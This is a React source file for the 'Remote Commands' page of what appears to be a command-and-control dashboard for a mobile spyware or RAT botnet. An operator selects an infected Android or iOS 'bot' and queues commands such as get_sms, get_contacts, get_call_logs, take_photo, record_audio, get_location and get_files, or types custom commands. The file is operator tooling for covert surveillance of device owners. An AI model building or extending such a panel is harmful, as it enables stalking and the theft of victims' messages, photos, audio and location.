import { useState } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import DashboardLayout from "@/components/DashboardLayout";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Terminal } from "lucide-react";
import { toast } from "sonner";
import { useRole } from "@/hooks/useRole";

const Commands = () => {
  const { role, loading: roleLoading } = useRole();
  const [selectedBot, setSelectedBot] = useState<string>("");
  const [command, setCommand] = useState("");
  const queryClient = useQueryClient();

  const { data: bots } = useQuery({
    queryKey: ["bots"],
    queryFn: async () => {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) throw new Error("Not authenticated");

      const { data, error } = await supabase
        .from("bots")
        .select("*")
        .eq("user_id", user.id)
        .order("created_at", { ascending: false });

      if (error) throw error;
      return data;
    },
  });

  const sendCommand = useMutation({
    mutationFn: async (cmd: string) => {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) throw new Error("Not authenticated");
      
      const { error } = await supabase.from("logs").insert({
        user_id: user.id,
        bot_id: selectedBot,
        command: cmd,
        status: "pending",
      });

      if (error) throw error;
    },
    onSuccess: () => {
      toast.success("Command sent successfully");
      queryClient.invalidateQueries({ queryKey: ["logs"] });
    },
    onError: () => {
      toast.error("Failed to send command");
    },
  });

  const handleSendCommand = () => {
    if (!command || !selectedBot || role === "demo") {
      if (role === "demo") {
        toast.error("Demo users cannot execute commands");
      } else {
        toast.error("Please select a bot and enter a command");
      }
      return;
    }
    sendCommand.mutate(command);
  };

  const handleQuickCommand = (cmd: string) => {
    if (!selectedBot || role === "demo") {
      if (role === "demo") {
        toast.error("Demo users cannot execute commands");
      } else {
        toast.error("Please select a bot first");
      }
      return;
    }
    sendCommand.mutate(cmd);
  };

  const selectedBotData = bots?.find(bot => bot.id === selectedBot);
  const isIOS = selectedBotData?.platform?.toLowerCase() === 'ios';

  const androidCommands = [
    { name: "Get Location", command: "get_location" },
    { name: "Get SMS", command: "get_sms" },
    { name: "Get Contacts", command: "get_contacts" },
    { name: "Get Call Logs", command: "get_call_logs" },
    { name: "Take Photo", command: "take_photo" },
    { name: "Record Audio", command: "record_audio" },
    { name: "Get Files", command: "get_files" },
    { name: "Vibrate", command: "vibrate" },
    { name: "Get Installed Apps", command: "get_apps" },
    { name: "Screen On/Off", command: "screen_toggle" },
  ];

  const iosCommands = [
    { name: "Get Location", command: "ios_get_location" },
    { name: "Get Contacts", command: "ios_get_contacts" },
    { name: "Get Photos", command: "ios_get_photos" },
    { name: "Get Calendar", command: "ios_get_calendar" },
    { name: "Get Notes", command: "ios_get_notes" },
    { name: "Take Photo", command: "ios_take_photo" },
    { name: "Record Audio", command: "ios_record_audio" },
    { name: "Get Device Info", command: "ios_device_info" },
    { name: "Get Installed Apps", command: "ios_get_apps" },
    { name: "Vibrate", command: "ios_vibrate" },
  ];

  const commandList = isIOS ? iosCommands : androidCommands;

  return (
    <DashboardLayout>
      <div className="space-y-6">
        <div>
          <h1 className="text-3xl font-bold tracking-tight">Remote Commands</h1>
          <p className="text-muted-foreground">Execute commands on connected devices</p>
        </div>

        <Card>
          <CardHeader>
            <CardTitle>Select Bot</CardTitle>
            <CardDescription>Choose a device to send commands to</CardDescription>
          </CardHeader>
          <CardContent className="space-y-4">
            <div>
              <Label>Bot</Label>
              <Select value={selectedBot} onValueChange={setSelectedBot}>
                <SelectTrigger>
                  <SelectValue placeholder="Select a bot" />
                </SelectTrigger>
                <SelectContent>
                  {bots?.map((bot) => (
                    <SelectItem key={bot.id} value={bot.id}>
                      {bot.name} - {bot.model} ({bot.platform})
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            {selectedBotData && (
              <div className="flex gap-2">
                <Badge variant="outline">
                  Platform: {selectedBotData.platform} {isIOS ? "📱" : "🤖"}
                </Badge>
                <Badge variant="outline">
                  Status: {selectedBotData.status}
                </Badge>
              </div>
            )}

            <div>
              <Label>Custom Command</Label>
              <div className="flex gap-2">
                <Input
                  placeholder="Enter command..."
                  value={command}
                  onChange={(e) => setCommand(e.target.value)}
                  disabled={!selectedBot || roleLoading || role === "demo"}
                />
                <Button 
                  onClick={handleSendCommand}
                  disabled={!selectedBot || !command || roleLoading || role === "demo"}
                >
                  Send
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>

        <Card>
          <CardHeader>
            <CardTitle>Quick Commands</CardTitle>
            <CardDescription>
              {selectedBotData 
                ? `${isIOS ? 'iOS' : 'Android'} specific commands` 
                : 'Execute common commands with one click'}
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="grid gap-2 md:grid-cols-2 lg:grid-cols-3">
              {commandList.map((cmd) => (
                <Button
                  key={cmd.command}
                  variant="outline"
                  onClick={() => handleQuickCommand(cmd.command)}
                  disabled={!selectedBot || roleLoading || role === "demo"}
                  className="justify-start"
                >
                  <Terminal className="mr-2 h-4 w-4" />
                  {cmd.name}
                </Button>
              ))}
            </div>
          </CardContent>
        </Card>
      </div>
    </DashboardLayout>
  );
};

export default Commands;
